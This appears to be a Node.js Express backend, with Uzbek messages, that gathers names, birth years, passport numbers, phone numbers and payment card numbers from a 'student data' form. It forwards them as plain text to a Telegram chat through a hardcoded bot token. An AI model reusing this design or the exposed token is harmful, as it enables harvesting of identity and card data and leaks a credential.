const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.post('/submit', (req, res) => {
    const { name, fatherName, birthYear, passport, phoneCode, phone, payment } = req.body;

    const message = `📄 O‘quvchi Ma’lumotlari:
👤 Ism: ${name}
👨‍👦 Otasining ismi: ${fatherName}
🎂 Tug‘ilgan yil: ${birthYear}
🪪 Passport: ${passport}
📞 Telefon: ${phoneCode} ${phone}
💳 To‘lov karta: ${payment}`;

    axios.post(`https://api.telegram.org/bot7594079987:AAFtnDxMMHKoeE4Z64FrLVcGv3zSi0znyTY/sendMessage`, {
            chat_id: 6361991111,
            text: message
        })
        .then(() => res.send("✅ Ma'lumot muvaffaqiyatli yuborildi!"))
        .catch(error => {
            console.error("Telegramga yuborishda xatolik:", error);
            res.status(500).send("❌ Xatolik yuz berdi!");
        });
});

app.listen(port, () => {
    console.log(`Server http://localhost:${port} da ishlayapti`);
});